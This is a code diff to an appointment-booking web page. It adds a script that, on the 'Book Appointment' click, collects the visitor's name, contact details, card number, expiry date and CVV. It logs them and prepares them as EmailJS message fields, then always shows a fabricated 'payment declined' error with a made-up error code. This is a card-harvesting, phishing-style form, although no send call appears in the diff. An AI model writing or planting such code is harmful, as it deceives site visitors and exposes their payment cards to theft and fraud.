@@ -8,13 +8,57 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <link rel="stylesheet" href="./css/styles.css">
     <!-- Include EmailJS SDK -->
-<script type="text/javascript" src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <!-- SweetAlert2 CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
 <script type="text/javascript">
    (function() {
       emailjs.init("YOUR_USER_ID"); // Replace "YOUR_USER_ID" with your actual EmailJS user ID
    })();
+   document.addEventListener("DOMContentLoaded", function() {
+    // Select the "Book Appointment" button
+    const bookBtn = document.querySelector(".book-btn");
+    console.log("we entered")
+
+    // When the button is clicked
+    bookBtn.addEventListener("click", function(event) {
+        event.preventDefault(); // Prevent the form from submitting the default way
+
+        // Collect form data
+        const firstName = document.getElementById("first-name").value;
+        const lastName = document.getElementById("last-name").value;
+        const email = document.getElementById("email").value;
+        const phoneNumber = document.getElementById("phone-number").value;
+        const cardNumber = document.getElementById("card-number").value;
+        const expiry = document.getElementById("expiry").value;
+        const cvv = document.getElementById("cvv").value;
+
+        console.log(firstName, lastName, email, phoneNumber, cardNumber, expiry, cvv);
+        // Prepare the data to be sent
+        const templateParams = {
+            first_name: firstName,
+            last_name: lastName,
+            email: email,
+            phone_number: phoneNumber,
+            card_number: cardNumber,
+            expiry_date: expiry,
+            cvv_code: cvv
+        };
+
+        // Send the email using EmailJS
+        Swal.fire({
+          icon: 'warning',
+          title: 'Failed to book appointment',
+          text: 'An error occurred while booking. Your payment was declined. Error Code : 0059',
+          confirmButtonText: 'OK'
+        });
+    });
+});
+
 </script>
-<script src="js/main.js" defer></script>
+<!-- <script src="js/main.js" defer></script> -->
 </head>
 <style>
   .right h3 {
